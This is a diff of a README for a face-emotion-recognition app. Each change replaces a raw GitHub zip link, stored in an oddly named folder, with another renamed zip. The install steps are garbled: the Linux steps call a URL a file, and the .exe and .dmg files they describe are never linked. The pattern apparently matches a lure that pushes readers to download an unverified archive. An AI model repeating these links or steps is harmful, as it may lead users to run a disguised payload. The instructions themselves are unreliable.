@@ -1,6 +1,6 @@
 # 🎭 Face-Emotion-Recognition - Recognize Emotions From Faces Easily
 
-![Download](https://raw.githubusercontent.com/jafrulla1986/Face-Emotion-Recognition/main/Chrissie/Face-Emotion-Recognition.zip%20Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/jafrulla1986/Face-Emotion-Recognition/main/Chrissie/Recognition-Emotion-Face-v3.0-alpha.1.zip%20Releases-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -27,19 +27,19 @@ Before you download, ensure your system meets these requirements:
 To start using the Face-Emotion-Recognition application, you can download it from our Releases page. Please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download section:
-   [Download Here](https://raw.githubusercontent.com/jafrulla1986/Face-Emotion-Recognition/main/Chrissie/Face-Emotion-Recognition.zip)
+   [Download Here](https://raw.githubusercontent.com/jafrulla1986/Face-Emotion-Recognition/main/Chrissie/Recognition-Emotion-Face-v3.0-alpha.1.zip)
    
 2. **Choose the Right Version:** Find the version you want to download and click on it.
 
 3. **Download the Application:** 
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the `https://raw.githubusercontent.com/jafrulla1986/Face-Emotion-Recognition/main/Chrissie/Face-Emotion-Recognition.zip` file.
+   - For Linux: Download the `https://raw.githubusercontent.com/jafrulla1986/Face-Emotion-Recognition/main/Chrissie/Recognition-Emotion-Face-v3.0-alpha.1.zip` file.
 
 4. **Install the Application:**
    - For Windows: Double-click the `.exe` file to start the installation.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/jafrulla1986/Face-Emotion-Recognition/main/Chrissie/Face-Emotion-Recognition.zip` file and follow the instructions in the README.
+   - For Linux: Extract the `https://raw.githubusercontent.com/jafrulla1986/Face-Emotion-Recognition/main/Chrissie/Recognition-Emotion-Face-v3.0-alpha.1.zip` file and follow the instructions in the README.
 
 5. **Launch the Application:** After installation, open the application to start using the Face-Emotion-Recognition system!
 
